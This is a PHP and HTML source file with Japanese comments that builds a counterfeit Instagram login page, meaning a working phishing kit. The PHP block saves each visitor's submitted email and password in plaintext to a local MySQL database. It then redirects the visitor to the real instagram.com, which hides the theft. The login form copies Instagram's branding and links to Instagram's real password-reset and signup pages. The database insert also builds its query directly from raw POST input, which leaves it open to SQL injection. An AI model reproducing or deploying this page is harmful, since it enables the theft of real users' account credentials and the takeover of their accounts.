<?php
$servername = "localhost";  // サーバー名
$username = "root";         // MySQLのユーザー名
$password = "";             // MySQLのパスワード
$dbname = "instagram_login"; // 使用するデータベース名

// MySQL接続
$conn = new mysqli($servername, $username, $password, $dbname);

// 接続チェック
if ($conn->connect_error) {
    die("接続失敗: " . $conn->connect_error);
}

// フォームが送信された場合
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    // 入力されたデータを取得
    $email = $_POST['email'];
    $password = $_POST['password'];

    // SQLクエリを準備してデータを挿入
    $sql = "INSERT INTO users (email, password) VALUES ('$email', '$password')";

    if ($conn->query($sql) === TRUE) {
        // 新しいレコードが作成されたらInstagramのトップページにリダイレクト
        header("Location: https://www.instagram.com/");
        exit(); // リダイレクト後は処理を終了
    } else {
        echo "エラー: " . $sql . "<br>" . $conn->error;
    }

    // 接続を閉じる
    $conn->close();
}
?>

<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram ログイン</title>
    <style>
        /* スタイルはそのまま */
        body {
            font-family: Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background-color: #ffffff;
            padding: 40px;
            border-radius: 1rem;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 350px;
        }
        h1 {
            font-family: 'Instagram', sans-serif;
            text-align: center;
            margin-bottom: 20px;
        }
        .login-btn {
            width: 100%;
            padding: 10px;
            background-color: #0095F6;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }
        .login-btn:hover {
            background-color: #007bb5;
        }
        .login-options {
            text-align: center;
            margin-top: 20px;
        }
        .login-options a {
            text-decoration: none;
            color: #0095F6;
        }
        .input-field {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border-radius: 5px;
            border: 1px solid #ddd;
        }
        .input-field:focus {
            outline: none;
            border-color: #0095F6;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQpVwRBxzt2CKyBQpzADMJaaOzG9d_mZ9lWEw&s" alt="instagram" />

        <!-- フォーム開始 -->
        <form method="POST" action="login.php">
            <input type="text" name="email" class="input-field" placeholder="電話番号、ユーザー名、メールアドレス" required>
            <input type="password" name="password" class="input-field" placeholder="パスワード" required>
        
            <div class="login-options">
                <a href="https://www.instagram.com/accounts/password/reset/?next=%2Ftrip.com_jp%2Ffeed%2F&locale=ja-JP">パスワードを忘れた場合</a><br>
                <button type="submit" class="login-btn">ログイン</button><br>
                <p>アカウントをお持ちではないですか？ <a href="https://www.instagram.com/accounts/emailsignup/?next=%2Ftrip.com_jp%2Ffeed%2F&locale=ja-JP">登録する</a></p>
            </div>
        </form>
        <!-- フォーム終了 -->
    </div>
</body>
</html>
